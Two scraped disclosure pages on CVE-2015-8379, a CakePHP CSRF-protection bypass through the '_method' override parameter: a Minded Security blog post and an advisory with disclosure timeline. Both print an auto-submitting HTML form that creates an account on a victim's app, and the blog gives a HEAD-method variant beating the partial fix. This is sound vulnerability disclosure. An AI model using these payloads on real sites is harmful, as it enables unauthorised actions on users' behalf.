=== Content from blog.mindedsecurity.com_f5e79aa2_20250125_063103.html ===


[Subscribe our newsletter](https://mindedsecurity.com/newsletter)

[Minded Security](https://mindedsecurity.com)

* Industry
  + [Automotive/Maritime](https://mindedsecurity.com/industry/automotive-maritime/ "Automotive/Maritime")
  + [Financial](https://mindedsecurity.com/industry/financial/ "Financial")
  + [GDO](https://mindedsecurity.com/industry/gdo/ "GDO")
  + [Industrial Control Systems](https://mindedsecurity.com/industry/industrial-control-systems/ "Industrial Control Systems")
  + [IoT Security](https://mindedsecurity.com/industry/iot-security/ "IoT Security")
  + [Healthcare](https://mindedsecurity.com/industry/healthcare/ "Healthcare")
  + [Government](https://mindedsecurity.com/industry/government/ "Government")
* [Services](https://mindedsecurity.com/our-services/ "Services")
  + [Training](https://mindedsecurity.com/our-services/training/ "Training")
    - [Security Hackaton](https://mindedsecurity.com/services/training/security-hackaton/ "Security Hackaton")
    - [Advanced On-site Training](https://mindedsecurity.com/services/training/advanced-on-site-training/ "Advanced On-site Training")
    - [BlueClosure Training](https://mindedsecurity.com/services/training/blueclosure-training/ "BlueClosure Training")
    - [High Level Training](https://mindedsecurity.com/services/training/high-level-training/ "High Level Training")
    - [Webinar](https://mindedsecurity.com/services/training/webinar/ "Webinar")
  + [Testing](https://mindedsecurity.com/our-services/testing/ "Testing")
    - [Manual Secure Code Review](https://mindedsecurity.com/services/testing/manual-secure-code-review/ "Manual Secure Code Review")
    - [Manual WAPT](https://mindedsecurity.com/services/testing/manual-wapt/ "Manual WAPT")
    - [Cloud Security Testing](https://mindedsecurity.com/services/testing/cloud-security-testing/ "Cloud Security Testing")
    - [IoT Security](https://mindedsecurity.com/services/testing/iot-security/ "IoT Security")
    - [API Security](https://mindedsecurity.com/services/testing/api-security/ "API Security")
    - [Mobile Security Assessment](https://mindedsecurity.com/services/testing/mobile-security-assessment/ "Mobile Security Assessment")
    - [Client Side Assessment](https://mindedsecurity.com/services/testing/client-side-assessment/ "Client Side Assessment")
  + [Consulting](https://mindedsecurity.com/our-services/consulting/ "Consulting")
    - [Software Security Advisory](https://mindedsecurity.com/services/consulting/software-security-advisory/ "Software Security Advisory")
    - [5D Framework](https://mindedsecurity.com/services/consulting/5d-framework/ "5D Framework")
    - [Threat Modeling](https://mindedsecurity.com/services/consulting/threat-modeling/ "Threat Modeling")
    - [Secure Design](https://mindedsecurity.com/services/consulting/secure-design/ "Secure Design")
    - [Secure Architecture Review](https://mindedsecurity.com/services/consulting/secure-architecture-review/ "Secure Architecture Review")
    - [Secure Coding Guidelines](https://mindedsecurity.com/services/consulting/secure-coding-guidelines/ "Secure Coding Guidelines")
    - [Fixing Support](https://mindedsecurity.com/services/consulting/fixing-support/ "Fixing Support")
    - [Outsourcing Development Governance](https://mindedsecurity.com/services/consulting/outsourcing-development-governance/ "Outsourcing Development Governance")
  + [Request a brochure](https://mindedsecurity.com/request-a-brochure/ "Request a brochure")
* Resources
  + [Blog](https://blog.mindedsecurity.com/ "Blog")
  + [News](https://mindedsecurity.com/category/news/ "News")
  + [Videos](https://mindedsecurity.com/videos/ "Videos")
  + [Research](https://mindedsecurity.com/research/ "Research")
  + [Advisories](https://mindedsecurity.com/research/advisories/ "Advisories")
* [About us](https://mindedsecurity.com/our-mission/ "About us")
  + [The Company](https://mindedsecurity.com/the-company/ "The Company")
  + [Contact us](https://mindedsecurity.com/contact-us/ "Contact us")
  + [Newsletter](https://mindedsecurity.com/newsletter/ "Newsletter")
  + [Jobs](https://mindedsecurity.com/jobs/ "Jobs")
  + [Privacy Policy](https://mindedsecurity.com/privacy-policy/ "Privacy Policy")

## IMQ Minded Security Blog

[skip to main](#main)  |
[skip to sidebar](#sidebar)

## Tuesday, January 12, 2016

# Request parameter "\_method" may lead to CakePHP CSRF Token Bypass

In CakePHP we noticed that under certain circumstances is it possible to bypass the built-in security checks offered by CSRF and anti-tampering.

As stated in the official documentation "By using the Security Component you automatically get CSRF and form tampering protection" [1], however this is not true in case a form controller does not check whether the request is a 'POST' or 'PUT' using *$this->request->is()*.

This because CSRF protection is only applied to specific methods e.g *POST and PUT HTTP Methods*. In Addition by leveraging the HTTP method overriding feature defined into the *CakeRequest::\_processPost() method*, is possible to overwrite the original request method with an arbitrary method chosen by the attacker.

The following one is the original proof of concept that we sent to the CakePHP team, were by abusing the "\_method" parameter is possible to specify and arbitrary method e.g. "CSRF" that is not checked against CSRF.

### CSRF Bypass proof of Concept

The vulnerability can be exploited by tricking a victim user (currently logged into a vulnerable application) into visiting a web page like this:

`<html>

<body>

<form action="http://[HOST]/user/add" method="POST">

<input name="_method" type="hidden" value="CSRF" />

<input name="user" type="hidden" value="hacker" />

<input name="password" type="hidden" value="pwd" />

</form>

<script>document.forms[0].submit()</script>

</body>

</html>`

This affects CakePHP 2.x:

* <https://github.com/cakephp/cakephp/blob/2.7/lib/Cake/Controller/Component/SecurityComponent.php#L237>

And similarly affects also CakePHP 3.x:

* <https://github.com/cakephp/cakephp/blob/3.2/src/Controller/Component/SecurityComponent.php#L118>
* <https://github.com/cakephp/cakephp/blob/3.2/src/Controller/Component/CsrfComponent.php#L95>

Thanks to our feedback, developers of CakePHP have issued this patch:

* <https://github.com/cakephp/cakephp/commit/0f818a23a876c01429196bf7623e1e94a50230f0>

It's important to mention that this patch implemented by CakePHP team now allows only *GET, HEAD, OPTIONS* methods to be left unprotected: indeed this is *a partial* fix. Of course the previous proof of concept will no longer work , however with little modifications e.g. **<input name="\_method" type="hidden" value="HEAD" />** attackers will still have the job done.

### Developers  should check HTTP method carefully

###

#### The official documentation has also been updated

Now we see in here the written evidence that developers should properly check request HTTP methods before processing the request. To not be vulnerable to trivial CSRF attacks be sure that your CakePHP application always checks HTTP methods, as now correctly stated in the updated documentation [2]

#### The important note regarding the mandatory check is:

*"You should always verify the HTTP method being used before executing side-effects. You should check the HTTP method or use Cake\Network\Request::allowMethod() to ensure the correct HTTP method is used."*

#### References:

[1]
<http://book.cakephp.org/2.0/en/core-libraries/components/security-component.html>

[2]
<http://book.cakephp.org/3.0/en/controllers/components/csrf.html>

Vulnerability Found and Reported by Egidio Romano

By

[Giorgio Fedon](https://www.blogger.com/profile/17285473210424014740 "author profile")

at

[10:23 AM](https://blog.mindedsecurity.com/2016/01/request-parameter-method-may-lead-to.html "permanent link")

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=4268472252873101203&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4268472252873101203&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4268472252873101203&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4268472252873101203&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4268472252873101203&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=4268472252873101203&target=pinterest "Share to Pinterest")

#### 1 comment :

1. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Anna](https://www.blogger.com/profile/05734220215058808818)[June 2, 2016 at 5:42 AM](https://blog.mindedsecurity.com/2016/01/request-parameter-method-may-lead-to.html?showComment=1464871335327#c7171152838978178197)

   nice

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=7122745763234660283&postID=7171152838978178197)Replies
   Reply

Add commentLoad more...

[Newer Post](https://blog.mindedsecurity.com/2016/02/rat-wars-20-advanced-techniques-for.html "Newer Post")

[Older Post](https://blog.mindedsecurity.com/2015/11/reliable-os-shell-with-el-expression.html "Older Post")

[Home](https://blog.mindedsecurity.com/)

Subscribe to:
[Post Comments
(
Atom
)](https://blog.mindedsecurity.com/feeds/4268472252873101203/comments/default)

##

## Labels

* [3rd party javascript](https://blog.mindedsecurity.com/search/label/3rd%20party%20javascript)
  (
  2
  )
* [absolute path check](https://blog.mindedsecurity.com/search/label/absolute%20path%20check)
  (
  1
  )
* [Adobe](https://blog.mindedsecurity.com/search/label/Adobe)
  (
  3
  )
* [Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
  (
  5
  )
* [adware](https://blog.mindedsecurity.com/search/label/adware)
  (
  1
  )
* [AFNetworking](https://blog.mindedsecurity.com/search/label/AFNetworking)
  (
  1
  )
* [agile](https://blog.mindedsecurity.com/search/label/agile)
  (
  1
  )
* [AMT](https://blog.mindedsecurity.com/search/label/AMT)
  (
  1
  )
* [Android](https://blog.mindedsecurity.com/search/label/Android)
  (
  1
  )
* [Android Security](https://blog.mindedsecurity.com/search/label/Android%20Security)
  (
  6
  )
* [Anti-Tampering](https://blog.mindedsecurity.com/search/label/Anti-Tampering)
  (
  2
  )
* [Antitamper](https://blog.mindedsecurity.com/search/label/Antitamper)
  (
  2
  )
* [Applet Security](https://blog.mindedsecurity.com/search/label/Applet%20Security)
  (
  6
  )
* [Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
  (
  23
  )
* [appsec](https://blog.mindedsecurity.com/search/label/appsec)
  (
  1
  )
* [Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
  (
  4
  )
* [architecture](https://blog.mindedsecurity.com/search/label/architecture)
  (
  1
  )
* [asp.net](https://blog.mindedsecurity.com/search/label/asp.net)
  (
  2
  )
* [ast](https://blog.mindedsecurity.com/search/label/ast)
  (
  1
  )
* [attacks](https://blog.mindedsecurity.com/search/label/attacks)
  (
  1
  )
* [Authentication](https://blog.mindedsecurity.com/search/label/Authentication)
  (
  1
  )
* [Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
  (
  1
  )
* [Automotive](https://blog.mindedsecurity.com/search/label/Automotive)
  (
  1
  )
* [Banking](https://blog.mindedsecurity.com/search/label/Banking)
  (
  4
  )
* [Banking Malware](https://blog.mindedsecurity.com/search/label/Banking%20Malware)
  (
  1
  )
* [blackbox](https://blog.mindedsecurity.com/search/label/blackbox)
  (
  1
  )
* [blueclosure](https://blog.mindedsecurity.com/search/label/blueclosure)
  (
  1
  )
* [burp](https://blog.mindedsecurity.com/search/label/burp)
  (
  1
  )
* [canonicalization](https://blog.mindedsecurity.com/search/label/canonicalization)
  (
  1
  )
* [Certificate Pinning](https://blog.mindedsecurity.com/search/label/Certificate%20Pinning)
  (
  1
  )
* [chat](https://blog.mindedsecurity.com/search/label/chat)
  (
  1
  )
* [Client Side HTTP Parameter Pollution](https://blog.mindedsecurity.com/search/label/Client%20Side%20HTTP%20Parameter%20Pollution)
  (
  1
  )
* [cloud](https://blog.mindedsecurity.com/search/label/cloud)
  (
  1
  )
* [cloud browsing](https://blog.mindedsecurity.com/search/label/cloud%20browsing)
  (
  1
  )
* [Code Protection](https://blog.mindedsecurity.com/search/label/Code%20Protection)
  (
  2
  )
* [compliance](https://blog.mindedsecurity.com/search/label/compliance)
  (
  1
  )
* [Concrete5](https://blog.mindedsecurity.com/search/label/Concrete5)
  (
  1
  )
* [Content Security Policy](https://blog.mindedsecurity.com/search/label/Content%20Security%20Policy)
  (
  1
  )
* [CORS](https://blog.mindedsecurity.com/search/label/CORS)
  (
  1
  )
* [Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
  (
  7
  )
* [CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
  (
  1
  )
* [CVE-2021-44228](https://blog.mindedsecurity.com/search/label/CVE-2021-44228)
  (
  1
  )
* [DAB](https://blog.mindedsecurity.com/search/label/DAB)
  (
  1
  )
* [defense](https://blog.mindedsecurity.com/search/label/defense)
  (
  1
  )
* [deobfuscation](https://blog.mindedsecurity.com/search/label/deobfuscation)
  (
  2
  )
* [DeviceSecurity](https://blog.mindedsecurity.com/search/label/DeviceSecurity)
  (
  2
  )
* [DEVSECOPS](https://blog.mindedsecurity.com/search/label/DEVSECOPS)
  (
  1
  )
* [dll](https://blog.mindedsecurity.com/search/label/dll)
  (
  1
  )
* [DNS Rebinding](https://blog.mindedsecurity.com/search/label/DNS%20Rebinding)
  (
  2
  )
* [DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
  (
  9
  )
* [Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
  (
  15
  )
* [DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
  (
  11
  )
* [DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
  (
  9
  )
* [download](https://blog.mindedsecurity.com/search/label/download)
  (
  1
  )
* [Dyre](https://blog.mindedsecurity.com/search/label/Dyre)
  (
  1
  )
* [Encryption](https://blog.mindedsecurity.com/search/label/Encryption)
  (
  3
  )
* [Expression Language Injection](https://blog.mindedsecurity.com/search/label/Expression%20Language%20Injection)
  (
  3
  )
* [fixing](https://blog.mindedsecurity.com/search/label/fixing)
  (
  1
  )
* [Flex](https://blog.mindedsecurity.com/search/label/Flex)
  (
  2
  )
* [Flutter](https://blog.mindedsecurity.com/search/label/Flutter)
  (
  1
  )
* [gameover](https://blog.mindedsecurity.com/search/label/gameover)
  (
  1
  )
* [Google Plus One](https://blog.mindedsecurity.com/search/label/Google%20Plus%20One)
  (
  1
  )
* [google security](https://blog.mindedsecurity.com/search/label/google%20security)
  (
  1
  )
* [Http Parameter Pollution](https://blog.mindedsecurity.com/search/label/Http%20Parameter%20Pollution)
  (
  2
  )
* [Http Request Splitting](https://blog.mindedsecurity.com/search/label/Http%20Request%20Splitting)
  (
  1
  )
* [Information Disclosure](https://blog.mindedsecurity.com/search/label/Information%20Disclosure)
  (
  2
  )
* [innovation](https://blog.mindedsecurity.com/search/label/innovation)
  (
  2
  )
* [intruder](https://blog.mindedsecurity.com/search/label/intruder)
  (
  1
  )
* [iOS](https://blog.mindedsecurity.com/search/label/iOS)
  (
  2
  )
* [iOS Security](https://blog.mindedsecurity.com/search/label/iOS%20Security)
  (
  7
  )
* [IoT](https://blog.mindedsecurity.com/search/label/IoT)
  (
  2
  )
* [ISO21434](https://blog.mindedsecurity.com/search/label/ISO21434)
  (
  1
  )
* [J2EE](https://blog.mindedsecurity.com/search/label/J2EE)
  (
  1
  )
* [Java](https://blog.mindedsecurity.com/search/label/Java)
  (
  5
  )
* [Java Faces](https://blog.mindedsecurity.com/search/label/Java%20Faces)
  (
  1
  )
* [Java Security](https://blog.mindedsecurity.com/search/label/Java%20Security)
  (
  2
  )
* [javascript](https://blog.mindedsecurity.com/search/label/javascript)
  (
  4
  )
* [JavaScript Security](https://blog.mindedsecurity.com/search/label/JavaScript%20Security)
  (
  2
  )
* [JNLP Security](https://blog.mindedsecurity.com/search/label/JNLP%20Security)
  (
  1
  )
* [jQuery](https://blog.mindedsecurity.com/search/label/jQuery)
  (
  2
  )
* [JSON](https://blog.mindedsecurity.com/search/label/JSON)
  (
  1
  )
* [Libraries Security](https://blog.mindedsecurity.com/search/label/Libraries%20Security)
  (
  1
  )
* [Liferay](https://blog.mindedsecurity.com/search/label/Liferay)
  (
  1
  )
* [Linkedin.com](https://blog.mindedsecurity.com/search/label/Linkedin.com)
  (
  1
  )
* [Log4J](https://blog.mindedsecurity.com/search/label/Log4J)
  (
  1
  )
* [Magento](https://blog.mindedsecurity.com/search/label/Magento)
  (
  1
  )
* [malware](https://blog.mindedsecurity.com/search/label/malware)
  (
  9
  )
* [malware detector](https://blog.mindedsecurity.com/search/label/malware%20detector)
  (
  1
  )
* [MAPT](https://blog.mindedsecurity.com/search/label/MAPT)
  (
  4
  )
* [maxthon](https://blog.mindedsecurity.com/search/label/maxthon)
  (
  1
  )
* [microservices](https://blog.mindedsecurity.com/search/label/microservices)
  (
  1
  )
* [MitM](https://blog.mindedsecurity.com/search/label/MitM)
  (
  2
  )
* [Mobile](https://blog.mindedsecurity.com/search/label/Mobile)
  (
  5
  )
* [Mobile Security](https://blog.mindedsecurity.com/search/label/Mobile%20Security)
  (
  4
  )
* [MSTG](https://blog.mindedsecurity.com/search/label/MSTG)
  (
  3
  )
* [mvc](https://blog.mindedsecurity.com/search/label/mvc)
  (
  1
  )
* [Obfuscation](https://blog.mindedsecurity.com/search/label/Obfuscation)
  (
  3
  )
* [Omniture](https://blog.mindedsecurity.com/search/label/Omniture)
  (
  2
  )
* [Oracle NetBeans](https://blog.mindedsecurity.com/search/label/Oracle%20NetBeans)
  (
  1
  )
* [OWASP](https://blog.mindedsecurity.com/search/label/OWASP)
  (
  6
  )
* [OWASP 5D](https://blog.mindedsecurity.com/search/label/OWASP%205D)
  (
  2
  )
* [OWASP SAMM](https://blog.mindedsecurity.com/search/label/OWASP%20SAMM)
  (
  2
  )
* [OWASP Summit](https://blog.mindedsecurity.com/search/label/OWASP%20Summit)
  (
  1
  )
* [OWASP Top Ten](https://blog.mindedsecurity.com/search/label/OWASP%20Top%20Ten)
  (
  3
  )
* [p2p encryption](https://blog.mindedsecurity.com/search/label/p2p%20encryption)
  (
  1
  )
* [path traversal](https://blog.mindedsecurity.com/search/label/path%20traversal)
  (
  3
  )
* [peer to peer encryption](https://blog.mindedsecurity.com/search/label/peer%20to%20peer%20encryption)
  (
  1
  )
* [Polyglots](https://blog.mindedsecurity.com/search/label/Polyglots)
  (
  1
  )
* [Primefaces](https://blog.mindedsecurity.com/search/label/Primefaces)
  (
  1
  )
* [privacy](https://blog.mindedsecurity.com/search/label/privacy)
  (
  1
  )
* [puffin](https://blog.mindedsecurity.com/search/label/puffin)
  (
  1
  )
* [RAT](https://blog.mindedsecurity.com/search/label/RAT)
  (
  1
  )
* [RAT WARS](https://blog.mindedsecurity.com/search/label/RAT%20WARS)
  (
  1
  )
* [RATDET](https://blog.mindedsecurity.com/search/label/RATDET)
  (
  1
  )
* [RATWARS](https://blog.mindedsecurity.com/search/label/RATWARS)
  (
  1
  )
* [RDS](https://blog.mindedsecurity.com/search/label/RDS)
  (
  1
  )
* [Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)
  (
  3
  )
* [remote working](https://blog.mindedsecurity.com/search/label/remote%20working)
  (
  1
  )
* [reverse engineering](https://blog.mindedsecurity.com/search/label/reverse%20engineering)
  (
  1
  )
* [Same Origin Policy](https://blog.mindedsecurity.com/search/label/Same%20Origin%20Policy)
  (
  1
  )
* [sanitization](https://blog.mindedsecurity.com/search/label/sanitization)
  (
  1
  )
* [sast](https://blog.mindedsecurity.com/search/label/sast)
  (
  3
  )
* [Screen Control](https://blog.mindedsecurity.com/search/label/Screen%20Control)
  (
  1
  )
* [screenshot security](https://blog.mindedsecurity.com/search/label/screenshot%20security)
  (
  2
  )
* [SDL](https://blog.mindedsecurity.com/search/label/SDL)
  (
  2
  )
* [security](https://blog.mindedsecurity.com/search/label/security)
  (
  2
  )
* [security tools](https://blog.mindedsecurity.com/search/label/security%20tools)
  (
  1
  )
* [semgrep](https://blog.mindedsecurity.com/search/label/semgrep)
  (
  3
  )
* [Sharepoint](https://blog.mindedsecurity.com/search/label/Sharepoint)
  (
  1
  )
* [slack](https://blog.mindedsecurity.com/search/label/slack)
  (
  1
  )
* [Software Security Governance](https://blog.mindedsecurity.com/search/label/Software%20Security%20Governance)
  (
  1
  )
* [source code](https://blog.mindedsecurity.com/search/label/source%20code)
  (
  1
  )
* [Spring MVC](https://blog.mindedsecurity.com/search/label/Spring%20MVC)
  (
  1
  )
* [SQL Injection](https://blog.mindedsecurity.com/search/label/SQL%20Injection)
  (
  1
  )
* [SSL](https://blog.mindedsecurity.com/search/label/SSL)
  (
  2
  )
* [static analysis](https://blog.mindedsecurity.com/search/label/static%20analysis)
  (
  1
  )
* [Stored DOM Based XSS](https://blog.mindedsecurity.com/search/label/Stored%20DOM%20Based%20XSS)
  (
  1
  )
* [STRATEGY](https://blog.mindedsecurity.com/search/label/STRATEGY)
  (
  1
  )
* [superfish](https://blog.mindedsecurity.com/search/label/superfish)
  (
  1
  )
* [Supply Chain Security](https://blog.mindedsecurity.com/search/label/Supply%20Chain%20Security)
  (
  1
  )
* [SVG](https://blog.mindedsecurity.com/search/label/SVG)
  (
  1
  )
* [Swift](https://blog.mindedsecurity.com/search/label/Swift)
  (
  1
  )
* [TARA](https://blog.mindedsecurity.com/search/label/TARA)
  (
  1
  )
* [Telerik UI](https://blog.mindedsecurity.com/search/label/Telerik%20UI)
  (
  1
  )
* [TESTABLE](https://blog.mindedsecurity.com/search/label/TESTABLE)
  (
  1
  )
* [testing](https://blog.mindedsecurity.com/search/label/testing)
  (
  1
  )
* [Threat Modeling](https://blog.mindedsecurity.com/search/label/Threat%20Modeling)
  (
  1
  )
* [twitter](https://blog.mindedsecurity.com/search/label/twitter)
  (
  1
  )
* [UNECE R155](https://blog.mindedsecurity.com/search/label/UNECE%20R155)
  (
  1
  )
* [unzip directory traversal](https://blog.mindedsecurity.com/search/label/unzip%20directory%20traversal)
  (
  1
  )
* [UPnP](https://blog.mindedsecurity.com/search/label/UPnP)
  (
  2
  )
* [validation](https://blog.mindedsecurity.com/search/label/validation)
  (
  1
  )
* [Vulnerabilities statistics](https://blog.mindedsecurity.com/search/label/Vulnerabilities%20statistics)
  (
  1
  )
* [WAF](https://blog.mindedsecurity.com/search/label/WAF)
  (
  1
  )
* [WAPT](https://blog.mindedsecurity.com/search/label/WAPT)
  (
  1
  )
* [Web Application Firewall](https://blog.mindedsecurity.com/search/label/Web%20Application%20Firewall)
  (
  1
  )
* [web architecture security](https://blog.mindedsecurity.com/search/label/web%20architecture%20security)
  (
  1
  )
* [Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
  (
  23
  )
* [web cache](https://blog.mindedsecurity.com/search/label/web%20cache)
  (
  1
  )
* [web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
  (
  4
  )
* [Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)
  (
  23
  )
* [Windows Phone Security](https://blog.mindedsecurity.com/search/label/Windows%20Phone%20Security)
  (
  1
  )
* [WWeb Security](https://blog.mindedsecurity.com/search/label/WWeb%20Security)
  (
  2
  )
* [zeus p2p](https://blog.mindedsecurity.com/search/label/zeus%20p2p)
  (
  3
  )

## Blog Archive

* [May](https://blog.mindedsecurity.com/2024/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2024/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2024/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2023/10/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2023/06/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2023/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2023/02/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2022/07/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2021/12/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2021/08/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2021/05/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2021/02/)
  (
  1
  )
* [January](https://blog.mindedsecurity.com/2021/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2020/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2020/10/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2020/07/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2020/06/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2020/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2020/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2020/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2020/02/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2019/04/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2018/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2018/09/)
  (
  3
  )
* [July](https://blog.mindedsecurity.com/2018/07/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2018/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2018/04/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2017/11/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2017/06/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2016/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2016/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2015/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2015/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2015/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2015/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2015/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2015/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2015/03/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2015/02/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2014/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2014/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2014/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2013/10/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2013/04/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2013/02/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2012/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2012/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2012/09/)
  (
  4
  )
* [June](https://blog.mindedsecurity.com/2012/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2011/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2011/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2011/08/)
  (
  2
  )
* [July](https://blog.mindedsecurity.com/2011/07/)
  (
  2
  )
* [May](https://blog.mindedsecurity.com/2011/05/)
  (
  2
  )
* [April](https://blog.mindedsecurity.com/2011/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2011/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2010/10/)
  (
  8
  )
* [September](https://blog.mindedsecurity.com/2010/09/)
  (
  3
  )
* [August](https://blog.mindedsecurity.com/2010/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2010/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2010/04/)
  (
  4
  )
* [March](https://blog.mindedsecurity.com/2010/03/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2009/12/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2009/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2009/10/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2009/05/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2009/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2009/01/)
  (
  1
  )

####

Minded Security was established in Italy in 2007

with a focus on supporting businesses and

organizations to build secure products
 and services.

##### Services

* Training
* Testing
* Consulting
* Request a brochure

##### Information

* The Company
* blueclosure
* AMT – Banking Malware Detector
* Contact us
* Privacy Policy

##### Newsletter

©2015 Minded Security S.r.l. The Software Security Company - VAT IT05756380480

[Back to top](#top)



=== Content from karmainsecurity.com_802dc95e_20250125_063105.html ===

[egix@karmainsecurity ~ $](https://karmainsecurity.com/)

* [~/research](https://karmainsecurity.com/research)
* [~/blog](https://karmainsecurity.com/blog)
* [~/about](https://karmainsecurity.com/about)

# CakePHP <= 3.2.0 "\_method" CSRF Protection Bypass Vulnerability

#### â¢ Software Link:

<http://cakephp.org>

#### â¢ Affected Versions:

Version 3.2.0 RC1 and prior 3.x versions.

Version 2.8.0 RC1 and prior 2.x versions.

#### â¢ Vulnerability Description:

CakePHP provides some built-in security features including CSRF and Form Tampering protection. Under certain circumstances it might be possible to bypass such security checks, since they are performed only when the HTTP request is e.g. POST or PUT. CakePHP"s Router class uses a number of different indicators to detect the HTTP method being used, like the **"\_method"** POST parameter and the âX\_HTTP\_METHOD\_OVERRIDEâ and âREQUEST\_METHODâ headers. By abusing this behavior an attacker might be able to carry out CSRF attacks against CakePHP applications which do not check the HTTP method being used before executing side-effects. This is possible by overriding the HTTP method with a web page like this:

```
<html>
<body>
<form action="http://[HOST]/user/add" method="POST">
<input name="_method" type="hidden" value="CSRF" />
<input name="user" type="hidden" value="hacker" />
<input name="password" type="hidden" value="pwd" />
</form>
<script>document.forms[0].submit()</script>
</body>
</html>

```
#### â¢ Solution:

No official solution is currently available. The vendor updated the official documentation stating that developers should always check the HTTP method before executing side-effects.

NOTE: version 3.1.5 includes a bugfix for this issue stating âCSRF validation is applied to all HTTP methods that are not “GET”, “OPTIONS” or “HEAD”. This prevents invalid HTTP methods from bypassing CSRF validation.â, however this is a partial fix which does not solve the vulnerability, because the bypass might still work by using one of the unprotected HTTP methods.

#### â¢ Disclosure Timeline:

[10/11/2015] â Vendor notified

[26/11/2015] â Vendor tried to mitigate the issue with the following commit: <https://git.io/vzcda>

[01/12/2015] â Vendor response stating this issue has been addressed in version 3.1.5 and the documentation has been updated

[01/12/2015] â CVE number requested

[01/12/2015] â CVE number assigned

[12/01/2016] â Public disclosure

#### â¢ CVE Reference:

The Common Vulnerabilities and Exposures project ([cve.mitre.org](http://cve.mitre.org)) has assigned the name [CVE-2015-8379](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8379) to this vulnerability.

#### â¢ Credits:

Vulnerability discovered by Egidio Romano of Minded Security.

#### â¢ Other References:

<http://blog.mindedsecurity.com/2016/01/request-parameter-method-may-lead-to.html>

Karma(In)Security © 2025



=== Content from bakery.cakephp.org_1622209b_20250125_063101.html ===


